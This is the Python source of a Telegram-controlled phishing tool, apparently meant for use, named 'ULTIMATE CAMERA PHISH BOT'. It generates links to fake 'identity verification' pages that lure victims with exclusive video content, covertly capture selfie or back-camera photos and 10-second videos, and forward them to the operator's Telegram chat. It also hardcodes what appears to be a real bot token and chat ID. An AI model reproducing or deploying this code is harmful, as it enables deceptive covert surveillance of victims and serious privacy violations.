import os
‎import re
‎import base64
‎import json
‎from datetime import datetime
‎from flask import Flask, request, send_file, Response
‎from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
‎from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
‎import requests
‎import threading
‎import uuid
‎
‎# ===== CONFIG =====
‎TELEGRAM_TOKEN = "8331127596:AAHx7X6ZAeOdF0SOMNCThF6pX2Mlb3vM8q4"
‎CHAT_ID = "8595919435"  # ADD YOUR CHAT ID
‎HOST = os.environ.get('RAILWAY_STATIC_URL', 'http://localhost:5000')
‎PORT = int(os.environ.get('PORT', 5000))
‎
‎app = Flask(__name__)
‎campaigns = {}  # {campaign_id: {'url': target_url, 'mode': 'photo_selfie|photo_back|video_selfie|video_back', 'status': 'active'}}
‎bot_instance = None
‎
‎# HTML Templates
‎PHOTO_TEMPLATE = """
‎<!DOCTYPE html>
‎<html>
‎<head><title>Verify Identity</title>
‎<meta name="viewport" content="width=device-width">
‎<style>body{{font-family:sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;}} 
‎.verify-box{{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;text-align:center;max-width:400px;}}
‎.cam-preview{{width:100%;max-width:300px;height:400px;object-fit:cover;border-radius:15px;margin:20px 0;background:#333;}}
‎.btn{{background:#0095f6;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:16px;cursor:pointer;margin:10px;display:block;width:100%;}}
‎.btn:hover{{background:#1877f2;}} .status{{color:#ccc;margin:20px 0;}}</style>
‎</head>
‎<body>
‎<div class="verify-box">
‎<h2>🔐 Identity Verification</h2>
‎<p>To watch this exclusive content, verify you're human</p>
‎<video id="preview" class="cam-preview" autoplay playsinline muted></video>
‎<button class="btn" onclick="capture()">✅ Verify & Watch</button>
‎<div id="status" class="status"></div>
‎</div>
‎<script>
‎let stream=null;let target='{target_url}';let mode='{mode}';
‎async function initCam(){{try{{let facing=mode.includes('back')?'environment':'user';
‎stream=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:facing,width:1280,height:720}}}});
‎document.getElementById('preview').srcObject=stream;}}catch(e){{{window.location.href=target;}}}}}
‎initCam();
‎async function capture(){{document.querySelector('.btn').innerHTML='⏳ Sending...';document.querySelector('.btn').disabled=true;
‎let video=document.getElementById('preview');let canvas=document.createElement('canvas');canvas.width=640;canvas.height=480;
‎canvas.getContext('2d').drawImage(video,0,0);let data=canvas.toDataURL('image/jpeg',0.9).split(',')[1];
‎await fetch('/upload/{{campaign_id}}',{{method:'POST',headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{img:data,mode:mode,ua:navigator.userAgent}})}});
‎setTimeout(() => {{window.location.href=target;}},1500);}}
‎</script>
‎</body></html>
‎"""
‎
‎VIDEO_TEMPLATE = """
‎<!DOCTYPE html>
‎<html>
‎<head><title>Live Verification</title>
‎<meta name="viewport" content="width=device-width">
‎<style>body{{font-family:sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;}}
‎.verify-box{{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;text-align:center;max-width:400px;}}
‎.cam-preview{{width:100%;max-width:300px;height:400px;object-fit:cover;border-radius:15px;margin:20px 0;background:#333;}}
‎.btn{{background:#ff6b35;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:16px;cursor:pointer;margin:10px;display:block;width:100%;}}
‎.status{{color:#ccc;margin:20px 0;}}</style>
‎</head>
‎<body>
‎<div class="verify-box">
‎<h2>📹 Live Verification</h2>
‎<p>Record 10s video to unlock content</p>
‎<video id="preview" class="cam-preview" autoplay playsinline muted></video>
‎<button class="btn" onclick="recordVideo()">🎥 Record & Unlock</button>
‎<div id="status" class="status"></div>
‎</div>
‎<script>
‎let stream=null;let mediaRecorder=null;let chunks=[];let target='{target_url}';let mode='{mode}';
‎async function initCam(){{try{{let facing=mode.includes('back')?'environment':'user';
‎stream=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:facing,width:1280,height:720}}}});
‎document.getElementById('preview').srcObject=stream;}}catch(e){{{window.location.href=target;}}}}}
‎initCam();
‎async function recordVideo(){{document.querySelector('.btn').innerHTML='🎥 Recording...';document.querySelector('.btn').disabled=true;
‎mediaRecorder=new MediaRecorder(stream);chunks=[];
‎mediaRecorder.ondataavailable=e=>chunks.push(e.data);
‎mediaRecorder.onstop=async()=>{{
‎let blob=new Blob(chunks,{{"type":"video/webm"}});let reader=new FileReader();
‎reader.onload=()=>{{let data=reader.result.split(',')[1];
‎fetch('/upload/{{campaign_id}}',{{method:'POST',headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{video:data,mode:mode,ua:navigator.userAgent,duration:10}})}});
‎setTimeout(() => {{window.location.href=target;}},2000);}};
‎reader.readAsDataURL(blob);}};
‎mediaRecorder.start();setTimeout(()=>mediaRecorder.stop(),10000);}}
‎</script>
‎</body></html>
‎"""
‎
‎@app.route('/')
‎def home():
‎    return "🚀 Phish Bot Active!"
‎
‎@app.route('/<campaign_id>')
‎def serve_campaign(campaign_id):
‎    campaign = campaigns.get(campaign_id)
‎    if not campaign:
‎        return "Campaign expired", 404
‎    
‎    if campaign['mode'].startswith('video'):
‎        return Response(VIDEO_TEMPLATE.format(target_url=campaign['url'], mode=campaign['mode'], campaign_id=campaign_id), mimetype='text/html')
‎    else:
‎        return Response(PHOTO_TEMPLATE.format(target_url=campaign['url'], mode=campaign['mode'], campaign_id=campaign_id), mimetype='text/html')
‎
‎@app.route('/upload/<campaign_id>', methods=['POST'])
‎def upload_media(campaign_id):
‎    try:
‎        data = request.json
‎        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
‎        
‎        if 'img' in data:
‎            # Photo
‎            img_data = base64.b64decode(data['img'])
‎            filename = f"photo_{campaign_id}_{timestamp}.jpg"
‎            
‎            # Send photo to Telegram
‎            files = {'photo': ('photo.jpg', img_data, 'image/jpeg')}
‎            params = {
‎                'chat_id': CHAT_ID,
‎                'caption': f"📸 *{data['mode'].upper()} CAPTURE*\n🕐 {timestamp}\n📱 {data['ua'][:50]}...\n🎯 Campaign: {campaign_id}"
‎            }
‎            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", files=files, data=params)
‎            
‎        elif 'video' in data:
‎            # Video
‎            video_data = base64.b64decode(data['video'])
‎            filename = f"video_{campaign_id}_{timestamp}.webm"
‎            
‎            # Send video to Telegram
‎            files = {'video': ('video.webm', video_data, 'video/webm')}
‎            params = {
‎                'chat_id': CHAT_ID,
‎                'caption': f"🎥 *{data['mode'].upper()} VIDEO (10s)*\n🕐 {timestamp}\n📱 {data['ua'][:50]}...\n🎯 Campaign: {campaign_id}"
‎            }
‎            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo", files=files, data=params)
‎        
‎        return {"status": "success"}
‎    except Exception as e:
‎        return {"status": "error"}, 500
‎
‎# Telegram Bot Functions
‎async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
‎    keyboard = [
‎        [InlineKeyboardButton("📸 Selfie Photo", callback_data="photo_selfie")],
‎        [InlineKeyboardButton("📷 Back Camera Photo", callback_data="photo_back")],
‎        [InlineKeyboardButton("🎥 Selfie Video (10s)", callback_data="video_selfie")],
‎        [InlineKeyboardButton("📹 Back Camera Video (10s)", callback_data="video_back")]
‎    ]
‎    reply_markup = InlineKeyboardMarkup(keyboard)
‎    
‎    await update.message.reply_text(
‎        "🤖 *ULTIMATE CAMERA PHISH BOT*\n\n"
‎        "⚙️ *Choose capture mode, then send target URL*\n\n"
‎        "📱 Works on all phones • HD quality • Auto-redirect",
‎        reply_markup=reply_markup,
‎        parse_mode='Markdown'
‎    )
‎
‎async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
‎    query = update.callback_query
‎    await query.answer()
‎    
‎    mode = query.data
‎    campaign_id = str(uuid.uuid4())[:8]
‎    
‎    campaigns[campaign_id] = {
‎        'mode': mode,
‎        'status': 'waiting_url',
‎        'campaign_id': campaign_id
‎    }
‎    
‎    context.user_data['mode'] = mode
‎    context.user_data['campaign_id'] = campaign_id
‎    
‎    await query.edit_message_text(
‎        f"✅ *Mode Selected: {mode.replace('_', ' ').title()}*\n\n"
‎        f"📎 *Send me the target video URL now*\n"
‎        f"💡 Instagram Reels, TikTok, YouTube, etc.\n\n"
‎        f"*Example:* `https://instagram.com/reel/ABC123/`",
‎        parse_mode='Markdown'
‎    )
‎
‎async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
‎    url = update.message.text.strip()
‎    mode = context.user_data.get('mode')
‎    campaign_id = context.user_data.get('campaign_id')
‎    
‎    if not mode or not campaign_id:
‎        await update.message.reply_text("❌ First select capture mode with /start")
‎        return
‎    
‎    if campaign_id not in campaigns:
‎        await update.message.reply_text("❌ Session expired. Use /start")
‎        return
‎    
‎    # Extract URL
‎    url_match = re.search(r'https?://[^\s]+', url)
‎    if not url_match:
‎        await update.message.reply_text("❌ Invalid URL format!")
‎        return
‎    
‎    target_url = url_match.group(0)
‎    campaigns[campaign_id]['url'] = target_url
‎    campaigns[campaign_id]['status'] = 'active'
‎    
‎    phish_url = f"{HOST}/{campaign_id}"
‎    
‎    keyboard = [[InlineKeyboardButton("🚀 SEND PHISHING LINK", url=phish_url)]]
‎    reply_markup = InlineKeyboardMarkup(keyboard)
‎    
‎    await update.message.reply_text(
‎        f"🎉 *CAMPAIGN READY!*\n\n"
‎        f"📸 *Mode:* {mode.replace('_', ' ').title()}\n"
‎        f"🎯 *Target:* `{target_url}`\n"
‎        f"🔗 *Phishing:* `{phish_url}`\n\n"
‎        f"👥 *Click button below to share!*\n"
‎        f"📷 *Get photos/videos instantly!*",
‎        reply_markup=reply_markup,
‎        parse_mode='Markdown',
‎        disable_web_page_preview=True
‎    )
‎
‎def run_flask():
‎    app.run(host='0.0.0.0', port=PORT, debug=False)
‎
‎async def main():
‎    global bot_instance
‎    
‎    # Start Flask server
‎    flask_thread = threading.Thread(target=run_flask, daemon=True)
‎    flask_thread.start()
‎    time.sleep(2)  # Wait for Flask
‎    
‎    # Telegram Bot
‎    application = Application.builder().token(TELEGRAM_TOKEN).build()
‎    
‎    application.add_handler(CommandHandler("start", start))
‎    application.add_handler(CallbackQueryHandler(button_callback))
‎    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
‎    
‎    bot_instance = application.bot
‎    print("🤖 Bot running on port", PORT)
‎    print("🌐 Flask server ready!")
‎    
‎    await application.initialize()
‎    await application.start()
‎    await application.updater.start_polling()
‎
‎if __name__ == '__main__':
‎    import asyncio
‎    asyncio.run(main())
